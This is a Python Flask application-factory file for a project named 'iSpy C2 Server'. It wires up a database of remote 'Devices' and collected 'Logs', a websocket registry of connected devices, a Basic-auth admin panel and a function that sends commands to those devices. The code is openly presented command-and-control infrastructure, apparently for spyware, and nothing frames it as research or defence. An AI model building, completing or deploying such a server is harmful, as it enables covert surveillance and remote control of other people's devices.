"""
iSpy C2 Server
Flask Application Factory
"""

from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from flask_socketio import SocketIO
from flask_admin import Admin
from flask_admin.contrib.sqla import ModelView

from app.config import get_config
from app.middleware import init_limiter

# Global instances
db = SQLAlchemy()
socketio = SocketIO()
admin = Admin()

# Connected devices registry
connected_devices = {}

# Models (will be set after init)
Device = None
Log = None


def get_connected_devices():
    """Get connected devices dict"""
    return connected_devices


def create_app():
    """Application factory"""
    global Device, Log
    
    config = get_config()
    
    # Create Flask app
    app = Flask(__name__)
    app.config.from_object(config)
    
    # Initialize extensions
    db.init_app(app)
    
    socketio.init_app(
        app,
        cors_allowed_origins=config.ALLOWED_ORIGINS,
        ping_timeout=60,
        ping_interval=25,
        logger=False,
        engineio_logger=False
    )
    
    admin.init_app(app)
    
    # Initialize rate limiter
    limiter = init_limiter(app)
    
    # Apply rate limit to auth endpoint
    from app.routes.api import api_bp
    
    @limiter.limit("5 per minute")
    def limit_auth():
        pass
    
    # Initialize models
    from app.models import init_models
    models = init_models(db)
    Device = models['Device']
    Log = models['Log']
    
    # Make models globally accessible
    app.Device = Device
    app.Log = Log
    
    # Add admin views with custom templates
    from app.routes.admin import DeviceModelView, LogModelView
    admin.add_view(DeviceModelView(Device, db.session, name='Devices', endpoint='device'))
    admin.add_view(LogModelView(Log, db.session, name='Logs', endpoint='log'))
    
    # Register blueprints
    app.register_blueprint(api_bp)
    
    # Initialize socket handlers
    from app.routes.websocket import init_socket_handlers
    init_socket_handlers(socketio, app, db, Device, Log, connected_devices)
    
    # Create database tables
    with app.app_context():
        db.create_all()
    
    # Admin panel auth
    @app.before_request
    def require_admin_auth():
        from flask import request, Response
        import base64
        
        # Only protect admin routes
        if not request.path.startswith('/admin'):
            return None
        
        auth_header = request.headers.get('Authorization')
        
        if not auth_header:
            return Response(
                'Admin login required',
                401,
                {'WWW-Authenticate': 'Basic realm="iSpy C2 Admin"'}
            )
        
        try:
            if auth_header.startswith('Basic '):
                credentials = base64.b64decode(auth_header[6:]).decode('utf-8')
                username, password = credentials.split(':', 1)
                
                if username != config.ADMIN_USERNAME or password != config.ADMIN_PASSWORD:
                    raise ValueError('Invalid credentials')
            else:
                raise ValueError('Invalid auth type')
        except:
            return Response(
                'Invalid credentials',
                401,
                {'WWW-Authenticate': 'Basic realm="iSpy C2 Admin"'}
            )
    
    return app


def send_command_to_device(device_id: str, command: str, params: dict = None) -> bool:
    """Send command to a device"""
    from app.routes.websocket import send_command
    return send_command(socketio, connected_devices, device_id, command, params)
